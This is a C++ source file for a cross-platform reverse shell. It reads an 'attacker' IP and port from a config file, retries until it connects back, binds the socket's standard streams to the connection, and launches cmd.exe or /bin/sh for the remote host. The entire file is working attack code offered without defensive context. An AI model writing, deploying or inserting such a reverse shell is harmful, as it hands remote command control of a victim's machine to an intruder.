#include "rsp.hpp"
#include <chrono>

namespace rsp {
    App::App()
    : m_port(3388), m_ip("127.0.0.1") {
        m_config = std::make_unique<Config>("default.cfg");

        m_port = std::abs(std::atoi(m_config->Get("port").c_str()));
        std::cout << "rsp >> port - " << m_port << '\n';

        m_ip = m_config->Get("ip");
        std::cout << "rsp >> ip - " << m_ip << '\n';
    }

    Config* App::GetConfig() {
        return m_config.get();
    }

    uint16_t& App::GetPort() {
        return m_port;
    }
    
    std::string& App::GetIP() {
        return m_ip;
    }
};

auto main(int argc, char** argv) -> int {
    std::unique_ptr<rsp::App> app = std::make_unique<rsp::App>();

    #ifdef RSP_WINDOWS
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        SOCKET victim = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);

        sockaddr_in attacker;
        attacker.sin_family = AF_INET;
        attacker.sin_port = htons(app->GetPort());
        attacker.sin_addr.s_addr = inet_addr(app->GetIP().c_str());

        while(connect(victim, reinterpret_cast<sockaddr*>(&attacker), sizeof(attacker)) != 0) {
            std::cerr << "rsp >> cant connect to attacker" << '\n';
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }

        std::cout << "rsp >> connected successfully" << '\n';

        _dup2(victim, 0);
        _dup2(victim, 1);
        _dup2(victim, 2);

        system("cmd.exe");
        WSACleanup();
    #else
        int victim = socket(AF_INET, SOCK_STREAM, 0);

        sockaddr_in attacker;
        attacker.sin_family = AF_INET;
        attacker.sin_port = htons(app->GetPort());
        attacker.sin_addr.s_addr = inet_addr(app->GetIP().c_str());

        while(connect(victim, reinterpret_cast<sockaddr*>(&attacker), sizeof(attacker)) != 0) {
            std::cerr << "rsp >> cant connect to attacker" << '\n';
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }

        std::cout << "rsp >> connected successfully" << '\n';

        dup2(victim, 0);
        dup2(victim, 1);
        dup2(victim, 2);

        execl("/bin/sh", "sh", 0);
    #endif

    return 0;
}